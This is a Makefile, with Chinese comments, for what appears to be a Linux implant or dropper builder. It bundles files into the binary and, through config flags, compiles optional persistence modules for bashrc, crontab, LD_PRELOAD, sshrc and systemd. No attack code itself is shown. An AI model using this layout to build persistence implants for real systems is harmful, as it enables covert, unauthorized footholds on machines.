CC = gcc
CFLAGS = -Wall -Iinclude -Ibind

# 输出目录
OBJ_DIR = build/obj
BIN_DIR = build/target

# 创建输出目录
$(shell mkdir -p $(OBJ_DIR))
$(shell mkdir -p $(BIN_DIR))

# 触发绑定脚本
bind: bind/bind_files.h bind/bind_files.c

# 运行脚本以生成C文件
bind/bind_files.h bind/bind_files.c:
	cd scripts && ./bind.sh

# 默认目标
all: $(BIN_DIR)/main

# 固定配置文件路径
CONF_FILE = config/current_config.conf

# 读取配置文件
-include $(CONF_FILE)

SOURCES = src/main.c src/info.c src/release.c bind/bind_files.c

# 根据配置文件设置源文件和编译选项
ifeq ($(OS),linux)
    ifeq ($(FEATURE_BASHRC_MOD),1)
    	SOURCES += src/linux_persistence_bashrc.c
        CFLAGS += -DBASHRC_MOD
    endif
    ifeq ($(FEATURE_CRONTAB_MOD),1)
    	SOURCES += src/linux_persistence_crontab.c
        CFLAGS += -DCRONTAB_MOD
    endif
    ifeq ($(FEATURE_LD_PRELOAD_MOD),1)
    	SOURCES += src/linux_persistence_ld_preload.c
        CFLAGS += -DLD_PRELOAD_MOD
    endif
    ifeq ($(FEATURE_SSHRC_MOD),1)
    	SOURCES += src/linux_persistence_sshrc.c
        CFLAGS += -DSSHRC_MOD
    endif
    ifeq ($(FEATURE_SYSTEMD_MOD),1)
    	SOURCES += src/linux_persistence_systemd.c
        CFLAGS += -DSYSTEMD_MOD
    endif
endif

# 确保 SOURCES 不为空
SOURCES := $(filter-out ,$(SOURCES))
OBJECTS := $(addprefix $(OBJ_DIR)/,$(SOURCES:.c=.o))

# 编译项目
$(BIN_DIR)/main: $(OBJECTS)
	$(CC) -o $@ $^

$(OBJ_DIR)/%.o: %.c
	mkdir -p $(@D)  # 创建对象文件所在的目录
	$(CC) $(CFLAGS) -c $< -o $@

# 清理目标
clean:
	rm -rf build
	rm -rf bind
	rm -rf config

# PHONY目标
.PHONY: all clean
